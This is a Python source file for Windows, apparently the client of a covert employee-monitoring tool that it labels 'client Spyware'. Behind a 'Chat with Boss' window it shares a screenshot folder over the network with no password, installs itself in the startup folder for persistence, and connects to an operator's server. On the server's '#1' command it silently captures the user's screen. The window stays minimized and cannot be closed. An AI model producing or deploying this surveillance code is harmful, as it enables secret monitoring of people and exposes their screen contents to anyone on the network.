# Must need:: 'client-chat.ico icon' image in same folder updated 'server_id.txt'.

import socket  # socket
import os  # os.path dir operation
import win32net  # IMP::windows network sharing properties
import win32netcon  # IMP::windows network sharing properties
import time  # current time
import datetime  # current date and time
import pyautogui  # for screenshots operations
import _thread  # threading
import tkinter  # GUI properties
from tkinter import *  # GUI properties
from tkinter import filedialog  # GUI properties
from tkinter import messagebox  # Error msg
import winshell  # Shortcut creation in startup folder


c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_hostname = socket.gethostname()
client_ip = socket.gethostbyname(client_hostname)

#################################################################################
# IMP:: Please update "server_id.txt"(Server IPv4 Address) file before Battle with socket.
#################################################################################
PORT = 8000

temp_path = os.path.expanduser('~') + '\spywareimage'
if os.path.exists(temp_path) is False:
    os.mkdir(temp_path)
    pathname = temp_path.replace(os.sep, '/')
else:
    pathname = temp_path.replace(os.sep, '/')

# Create a directory on your Computer.
if not os.path.isdir(pathname):
    os.mkdir(pathname)

# Share directory over Public Network.
drive, sharename = os.path.split(pathname)
shinfo={}
shinfo['netname'] = sharename
shinfo['type'] = win32netcon.STYPE_DISKTREE
shinfo['remark'] = 'data files'
shinfo['permissions'] = 0
shinfo['max_uses'] = -1
shinfo['current_uses'] = 0
shinfo['path'] = pathname
shinfo['passwd'] = ''
if not os.path.isdir('//' + client_hostname + '/' + sharename):
    win32net.NetShareAdd(client_hostname, 2, shinfo)

serverip_textfile = '//' + client_hostname + '/' + sharename + '/' + 'server_id.txt'

if not os.path.isfile(serverip_textfile):
    open(serverip_textfile, 'w+')

if os.stat(serverip_textfile).st_size == 0:
    def send_data():
        f = open(serverip_textfile, 'w+')
        f.write(boss_ip_Entry.get())
        window.destroy()

    window = tkinter.Tk()
    window.title('Server IPv4 Address')
    window.geometry("400x130+400+200")
    window.resizable(0, 0)
    v = StringVar()
    tkinter.Label(window, font=('Comic Sans MS', 10, ''), text='Enter Server IPv4 Address: ').pack(pady=10)
    boss_ip_Entry = tkinter.Entry(window, font=('Comic Sans MS', 10, ''), textvariable=v)
    boss_ip_Entry.pack()
    tkinter.Button(window, font=('Comic Sans MS', 10, 'bold'), fg='#ffffff', bg='#4285F4', text='Save Input', command=send_data).pack(pady=10)
    window.mainloop()


startup = winshell.startup()
if not os.path.isfile(startup + '/' + 'desktopspy_client_v01.lnk'):
    winshell.CreateShortcut(
        Path=os.path.join(startup, 'desktopspy_client_v01.lnk'),
        Target=r"C:\Program Files (x86)\desktop-spy-client\desktopspy_client_v01.exe",
        Icon=(r"C:\Program Files (x86)\desktop-spy-client\desktopspy_client_v01.exe", 0),
        Description="client Spyware"
    )


def send_data():
    global c
    try:
        data = entry_box.get(1.0, END)
        chat_log.config(state=NORMAL)
        chat_log.insert(END, '>____You :\n' + data)
        chat_log.see(END)
        chat_log.config(state=DISABLED)
        entry_box.delete(1.0, END)
        c.send(bytes(data, 'utf-8'))
    except Exception as temp:
        pass
    return 0


def disable_event():
    chatbox.iconify()
    pass


def main_thread():  # Main Logic Thread
    global c
    while True:
        try:
            time.sleep(3)
            now = datetime.datetime.now()
            HOST = open(serverip_textfile).read()
            c.connect((HOST, PORT))
            chat_log.config(state=NORMAL)
            chat_log.insert(END, '>> server connected...\n')
            chat_log.see(END)
            chat_log.config(state=DISABLED)
            c.send(bytes(client_hostname, 'utf-8'))
            entry_box.configure(state=NORMAL)
            send_btn.configure(state=NORMAL)
            while True:
                try:
                    data = c.recv(1024)
                    temp_msg = str(data.decode('utf-8'))

                    if temp_msg[0] == '#':
                        case = int(temp_msg[1])

                        # logic >>>.............
                        if case == 1:
                            now = datetime.datetime.now()
                            pyautogui.screenshot(
                                pathname + "/" + str(now.day) + "-" + str(now.month) + "-" + str(now.year) + "--" + \
                                str(now.hour) + "_" + str(now.minute) + "_" + str(now.second) + ".png")
                        # logic .............<<<

                    else:
                        chatbox.deiconify()
                        chat_log.config(state=NORMAL)
                        chat_log.insert(END, '>____Boss :\n' + temp_msg)
                        chat_log.see(END)
                        chat_log.config(state=DISABLED)
                        entry_box.delete(1.0, END)
                except Exception as temp:
                    chat_log.config(state=NORMAL)
                    chat_log.insert(END, '>> server disconnected...\n')
                    chat_log.see(END)
                    chat_log.config(state=DISABLED)
                    entry_box.configure(state=DISABLED)
                    send_btn.configure(state=DISABLED)
                    break
            c.close()
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        except Exception as temp:
            chatbox.iconify()
            c.close()
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


_thread.start_new_thread(main_thread, ())  # Main Logic Thread starting

#################################################################################
# Client Chat GUI (Employee)
#################################################################################
font_temp = ('Comic Sans MS', 10, '')

# Create a Chat window
chatbox = tkinter.Tk()
chatbox.title('Chat Box')
chatbox.geometry('315x460')
chatbox.resizable(0, 0)
# chatbox.iconbitmap('client-chat.ico')

tkinter.Label(chatbox, font=('Comic Sans MS', 10, 'bold'), text="Let's chat.. with Boss..").grid(row=0, column=0, columnspan=3, padx=10, pady=10, sticky=W)
scrollbar = Scrollbar(chatbox, orient=VERTICAL)
chat_log = Text(chatbox, font=font_temp, padx=10, pady=10, width=30, height=18, bg='#ecf2fd', wrap=WORD, yscrollcommand=scrollbar.set, state=DISABLED)
scrollbar.config(command=chat_log.yview)
entry_box = Text(chatbox, padx=10, width=25, height=3, bg='#d9e6fc', font=font_temp, state=DISABLED)
send_btn = Button(chatbox, font=('Comic Sans MS', 10, 'bold'), fg='#ffffff', text="Send msg", bg='#4285F4', command=send_data, state=DISABLED)

# Place all components on the screen
chat_log.grid(row=1, column=0, columnspan=2, sticky=N+S+E+W)
scrollbar.grid(row=1, column=2, sticky=N+S)
entry_box.grid(row=2, column=0, pady=5)
send_btn.grid(row=2, column=1, pady=5, sticky=N+S+E+W)

chatbox.protocol("WM_DELETE_WINDOW", disable_event)
chatbox.iconify()
chatbox.mainloop()
